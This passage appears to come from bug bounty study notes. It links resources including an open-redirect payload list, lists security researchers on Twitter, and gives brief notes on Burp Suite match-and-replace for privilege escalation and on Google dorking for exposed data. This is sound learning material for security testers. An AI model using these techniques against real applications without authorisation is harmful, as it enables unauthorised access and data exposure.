- **[Bug Bounty Writeups](https://medium.com/bugbountywriteup):** An up-to-date list of writeups from the bug bounty community.
- **[Pentester Land](https://pentester.land):** A site with podcasts, newsletters, cheatsheets, challenges, and other pentesting resources.
- **[Bug Bounty Forum Tools](https://bugbountyforum.com/tools/):** A list of tools used in the industry, provided by researchers themselves.
- **[Open Redirect Payloads](https://github.com/cujanovic/Open-Redirect-Payloads/blob/master/Open-Redirect-payloads.txt):** A list of useful open URL redirect payloads.
- **[JSFiddle](https://www.jsfiddle.net)** and **[JSBin](https://www.jsbin.com/):** Online sandboxes for playing with HTML and testing various payloads.

#### Researchers to Follow on Twitter

- **[@securinti](https://www.twitter.com/securinti)**
- **[@filedescriptor](https://www.twitter.com/filedescriptor)**
- **[@Random_Robbie](https://www.twitter.com/Random_Robbie)**
- **[@iamnoooob](https://www.twitter.com/iamnoooob)**
- **[@omespino](https://www.twitter.com/omespino)**
- **[@brutelogic](https://www.twitter.com/brutelogic)**
- **[@WPalant](https://www.twitter.com/WPalant)**
- **[@h1_kenan](https://www.twitter.com/h1_kenan)**
- **[@irsdl](https://www.twitter.com/irsdl)**
- **[@Regala_](https://www.twitter.com/Regala_)**
- **[@Alyssa_Herrera_](https://www.twitter.com/Alyssa_Herrera_)**
- **[@ajxchapman](https://www.twitter.com/ajxchapman)**
- **[@ZephrFish](https://www.twitter.com/ZephrFish)**
- **[@albinowax](https://www.twitter.com/albinowax)**
- **[@damian_89_](https://www.twitter.com/damian_89_)**
- **[@rootpentesting](https://www.twitter.com/rootpentesting)**
- **[@akita_zen](https://www.twitter.com/akita_zen)**
- **[@0xw2w](https://www.twitter.com/0xw2w)**
- **[@gwendallecoguic](https://www.twitter.com/gwendallecoguic)**
- **[@ITSecurityguard](https://www.twitter.com/ITSecurityguard)**
- **[@samwcyo](https://www.twitter.com/samwcyo)**

### Notes on Using Burp Suite Match and Replace for Privilege Escalation

**Purpose:**

- Utilize Burp Suite's "match and replace" feature to escalate user privileges and discover hidden features in web applications.

**Key Techniques:**

- Modify server responses to change values (e.g., "false" to "true").
- Alter user roles to reveal hidden UI elements and functionalities.

**Applications:**

- Discover hidden features not yet released.
- Gain higher-level access to the application.

**Cautions:**

- Improper use may disrupt sessions or accounts.

**Example Use Cases:**

- Escalate user privileges by modifying response values.
- Identify and explore new features by revealing hidden UI components.

### Notes on Google Dorking

**Definition:**

- Google Dorking, also known as Google hacking, involves using advanced search techniques to find hidden information on websites that are not easily accessible through normal searches.

**Key Techniques:**

- Use of specific search operators like `intitle:`, `inurl:`, `filetype:`, and `site:` to refine search results and locate sensitive information.
- Combining multiple operators to narrow down searches further and find specific data.

**Applications:**

- Finding exposed documents, login pages, and other sensitive information.
- Used by investigators, penetration testers, and researchers to gather information.

**Ethical Considerations:**

- Ensure that Google Dorking is conducted ethically and legally, respecting privacy and data protection regulations.
